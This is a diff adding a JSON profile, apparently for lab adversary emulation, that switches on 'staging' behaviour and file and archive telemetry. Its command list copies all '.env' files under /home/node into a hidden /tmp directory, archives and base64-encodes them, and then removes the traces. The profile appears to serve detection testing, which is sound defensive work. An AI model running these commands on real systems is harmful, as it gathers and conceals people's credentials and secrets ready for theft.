@@ -1,0 +1,22 @@
+{
+    "safety_constraints": {
+        "lab_environment_only": true,
+        "no_real_exploit_logic": true,
+        "no_real_credential_attack_logic": true,
+        "no_unapproved_network_spread": true
+    },
+    "behavior_profile": {
+        "staging": true
+    },
+    "telemetry": {
+        "file_events": true,
+        "archive_creation": true
+    },
+    "commands": [
+        "mkdir -p /tmp/.backup_stash",
+        "find /home/node/ -type f -name '.env' -exec cp --parents {} /tmp/.backup_stash/ \\;",
+        "tar -czf /tmp/backup_stash.tar.gz -C /tmp .backup_stash",
+        "base64 /tmp/backup_stash.tar.gz > /tmp/backup_stash.tar.gz.b64.txt",
+        "rm -f /tmp/backup_stash.tar.gz && rm -rf /tmp/.backup_stash"
+    ]
+}
